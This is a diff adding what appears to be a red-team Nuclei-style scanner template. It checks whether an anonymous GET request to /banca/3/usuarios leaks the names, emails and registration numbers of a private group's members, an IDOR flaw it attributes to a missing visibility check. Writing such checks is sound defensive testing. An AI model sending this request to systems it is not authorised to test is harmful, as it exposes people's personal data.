@@ -1,0 +1,16 @@
+id: rt01-leak-membros-banca-privada-anon
+info:
+  name: "Anonimo le membros (nome/email/matricula) da banca 3 PRIVADA - getBancaUsers sem filtro de visibilidade"
+  author: redteam-sisdef
+  severity: medium
+  description: "GET /banca/:bancaId/usuarios (banca.service.getUsersByBanca) so confere existencia; banca 3 e privada e anonimo nao deveria ver membros."
+  tags: redteam,idor
+http:
+  - raw:
+      - |
+        GET /banca/3/usuarios HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
